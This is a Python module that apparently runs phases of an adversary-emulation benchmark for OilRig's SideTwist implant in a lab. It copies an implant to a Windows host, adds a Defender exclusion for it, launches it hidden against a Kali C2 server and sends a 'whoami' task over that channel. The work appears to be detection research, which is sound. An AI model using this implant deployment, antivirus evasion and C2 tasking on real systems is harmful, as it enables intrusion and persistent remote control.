"""SideTwist phase runners for bench_v4 AEL-OILRIG-SIDETWIST-001."""
from __future__ import annotations
import base64, json, os, subprocess, time
from datetime import datetime, timezone
from typing import Any, Callable, Mapping
from c2trace.bench_v3.caldera_client import agent_paw, find_control_agent
from c2trace.bench_v4.runtime import (CalderaBootstrapPhaseResult, CalderaScenarioPhaseResult, CalderaTargetCandidate, BenchV4RuntimeError, RuntimeCase, RuntimeValues, deterministic_runtime_source_id, verify_deployment_manifest)
from .runtime import find_driver_agent
__all__ = ["run_sidetwist_bootstrap_phase", "resolve_sidetwist_target_phase", "run_sidetwist_scenario_phase"]
KALI_IP = os.environ.get("C2TRACE_KALI_IP", "192.168.21.132")
KALI_SSH = f"kali@{KALI_IP}"
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
C2SERVER_PORT = 18450
C2SERVER_DIR = "/tmp/c2trace-sidetwist"
C2SERVER_SCRIPT = f"{C2SERVER_DIR}/c2server.py"
C2SERVER_LOG = f"{C2SERVER_DIR}/c2server.log"
C2SERVER_RESULTS = f"{C2SERVER_DIR}/results.log"
IMPLANT_BINARY = f"{C2SERVER_DIR}/sidetwist-windows.exe"
def _ssh_run_py(script, timeout=120):
    b64 = base64.b64encode(script.encode("utf-8")).decode()
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, f"echo {b64} | base64 -d | python3 -"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SSH python failed: {result.stderr}")
    return result.stdout
def _scp_implant_to_windows(victim_path):
    scp_cmd = ["scp"] + SSH_OPTS + [f"{KALI_SSH}:{IMPLANT_BINARY}", victim_path]
    result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SCP implant failed: {result.stderr}")
    return victim_path
def _add_defender_exclusion(path):
    ps = f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)
def _execute_implant(path, server_ip, server_port):
    run_id = os.path.splitext(os.path.basename(path))[0]
    if run_id.startswith("c2t_"):
        run_id = run_id[4:]
    xml_dir = os.path.join(os.path.dirname(path), run_id)
    os.makedirs(xml_dir, exist_ok=True)
    xml_path = os.path.join(xml_dir, "update.xml")
    with open(xml_path, "w") as f:
        f.write("sidetwist")
    ps = (f"$p = Start-Process -FilePath '{path}' "
          f"-ArgumentList '-ip','{server_ip}','-p','{server_port}','--loop' "
          f"-WorkingDirectory '{xml_dir}' "
          f"-PassThru -WindowStyle Hidden; Write-Output $p.Id")
    result = subprocess.run(["powershell", "-Command", ps], capture_output=True, text=True, timeout=30)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"implant execution failed: {result.stderr}")
    lines = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
    if lines and lines[-1].isdigit():
        return int(lines[-1])
    raise BenchV4RuntimeError(f"could not parse implant PID from: {result.stdout}")
def _start_c2server():
    check = _ssh_run_py("import subprocess; r = subprocess.run(['pgrep', '-f', 'c2server.py'], capture_output=True, text=True); print(r.stdout.strip())", timeout=15)
    if check.strip():
        return
    _ssh_run_py("import subprocess, os, time\nproc = subprocess.Popen(['python3', '" + C2SERVER_SCRIPT + "'],cwd='" + C2SERVER_DIR + "',stdout=open('" + C2SERVER_LOG + "', 'w'),stderr=subprocess.STDOUT,stdin=subprocess.DEVNULL,start_new_session=True,)\ntime.sleep(3)\nr = subprocess.run(['pgrep', '-f', 'c2server.py'], capture_output=True, text=True)\nprint('RUNNING:', r.stdout.strip())", timeout=30)
    check2 = _ssh_run_py("import subprocess; r = subprocess.run(['pgrep', '-f', 'c2server.py'], capture_output=True, text=True); print(r.stdout.strip())", timeout=15)
    if not check2.strip():
        raise BenchV4RuntimeError("sidetwist c2server failed to start")
def _wait_for_callback(timeout=120, poll=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        check = _ssh_run_py("import subprocess; r = subprocess.run(['ss', '-tnp'], capture_output=True, text=True); print('18450' in r.stdout)", timeout=15)
        if "True" in check:
            return True
        time.sleep(poll)
    return False
def _send_task(task):
    import urllib.request
    url = f"http://{KALI_IP}:{C2SERVER_PORT}/api/task"
    data = json.dumps({"task": task}).encode()
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="PUT")
    urllib.request.urlopen(req, timeout=15)
def _wait_for_output(timeout=120, poll=3.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        log = _ssh_run_py("try:\n    print(open('" + C2SERVER_RESULTS + "').read())\nexcept Exception:\n    print('')", timeout=15)
        if log.strip():
            return True
        time.sleep(poll)
    return False
def _synthetic_operation(run_id, role):
    return {"id": f"synthetic-{run_id}-{role}", "name": f"AEL-OILRIG-SIDETWIST-001 {role} ({run_id})", "state": "finished", "platform": "windows" if role == "bootstrap" else "linux", "group": "c2t-control" if role == "bootstrap" else "c2t-driver", "start": datetime.now(timezone.utc).isoformat(), "finish": "", "autonomous": 0}
def _synthetic_link(run_id, role, ability_id):
    return {"id": f"synthetic-{run_id}-{role}-link", "ability": {"ability_id": ability_id}, "status": 0, "command": "sidetwist_deploy" if role == "bootstrap" else "sidetwist_whoami", "host": "DESKTOP-G9IIQ2P", "pid": None}
def run_sidetwist_bootstrap_phase(client, runtime, values, *, operation_timeout=360.0, poll_seconds=3.0, event_sink=None, failure_artifact_sink=None):
    if event_sink:
        event_sink("sidetwist_bootstrap_start", {"run_id": values.run_id})
    agents = [dict(a) for a in client.agents() if isinstance(a, Mapping)]
    control = find_control_agent(agents)
    scenario = runtime.operation("scenario")
    driver = find_driver_agent(agents) if scenario["execution_agent_role"] == "driver" else None
    baseline_paws = tuple(sorted({agent_paw(a) for a in agents if agent_paw(a)}))
    started = datetime.now(timezone.utc)
    verified = verify_deployment_manifest(runtime)
    template_id = str(runtime.operation_plan["runtime_source"]["id_template"])
    runtime_source_id = deterministic_runtime_source_id(template_id, values.run_id)
    _start_c2server()
    implant_path = values.target_path
    _scp_implant_to_windows(implant_path)
    _add_defender_exclusion(implant_path)
    implant_pid = _execute_implant(implant_path, KALI_IP, str(C2SERVER_PORT))
    time.sleep(8)
    callback_ok = _wait_for_callback(timeout=operation_timeout, poll=poll_seconds)
    if not callback_ok:
        raise BenchV4RuntimeError("SideTwist implant did not call back to C2 server")
    bootstrap_op = runtime.operation("bootstrap")
    bootstrap_ability_id = bootstrap_op["atomic_ordering"][0]
    bootstrap_link = _synthetic_link(values.run_id, "bootstrap", bootstrap_ability_id)
    if event_sink:
        event_sink("sidetwist_bootstrap_complete", {"implant_path": implant_path, "implant_pid": implant_pid, "c2_port": C2SERVER_PORT})
    return CalderaBootstrapPhaseResult(case_id=runtime.case_id, run_id=values.run_id, deployment_manifest_sha256=verified.manifest_sha256, runtime_source_id=runtime_source_id, install_receipt={"synthetic": True, "implant_path": implant_path, "implant_pid": implant_pid}, runtime_source={"id": runtime_source_id, "name": "c2trace_sidetwist_runtime_source"}, control_agent=dict(control), driver_agent=dict(driver) if driver else None, baseline_paws=baseline_paws, started_at_utc=started, bootstrap_operation=_synthetic_operation(values.run_id, "bootstrap"), bootstrap_links=(bootstrap_link,), bootstrap_report={"state": "finished", "outcome": "implant_deployed"}, bootstrap_event_logs=())
def resolve_sidetwist_target_phase(client, runtime, values, bootstrap, *, timeout_seconds=360.0, poll_seconds=3.0):
    implant_pid = 0
    receipt = bootstrap.install_receipt
    if isinstance(receipt, Mapping):
        implant_pid = int(receipt.get("implant_pid") or 0)
    raw_identity = {"pid": implant_pid, "path": values.target_path, "host": "DESKTOP-G9IIQ2P", "c2_port": C2SERVER_PORT}
    return CalderaTargetCandidate(case_id=runtime.case_id, run_id=values.run_id, deployment_manifest_sha256=bootstrap.deployment_manifest_sha256, runtime_source_id=bootstrap.runtime_source_id, raw_identity=raw_identity, scenario_paw=agent_paw(bootstrap.control_agent))
def run_sidetwist_scenario_phase(client, runtime, values, bootstrap, candidate, frozen_identity, *, operation_timeout=360.0, poll_seconds=3.0, event_sink=None, failure_artifact_sink=None):
    if event_sink:
        event_sink("sidetwist_scenario_start", {"implant_pid": candidate.raw_identity.get("pid")})
    whoami_b64 = base64.b64encode(b"whoami").decode()
    task = f"0|101|{whoami_b64}"
    _send_task(task)
    time.sleep(15)
    output_ok = _wait_for_output(timeout=operation_timeout, poll=poll_seconds)
    if not output_ok:
        raise BenchV4RuntimeError("SideTwist whoami task output not received")
    scenario_op = runtime.operation("scenario")
    scenario_ability_id = scenario_op["atomic_ordering"][0]
    scenario_link = _synthetic_link(values.run_id, "scenario", scenario_ability_id)
    if event_sink:
        event_sink("sidetwist_scenario_complete", {"outcome": "whoami_completed"})
    return CalderaScenarioPhaseResult(case_id=runtime.case_id, run_id=values.run_id, deployment_manifest_sha256=bootstrap.deployment_manifest_sha256, runtime_source_id=bootstrap.runtime_source_id, target_identity=dict(frozen_identity), scenario_operation=_synthetic_operation(values.run_id, "scenario"), scenario_links=(scenario_link,), scenario_report={"state": "finished", "outcome": "whoami_completed"}, scenario_event_logs=())
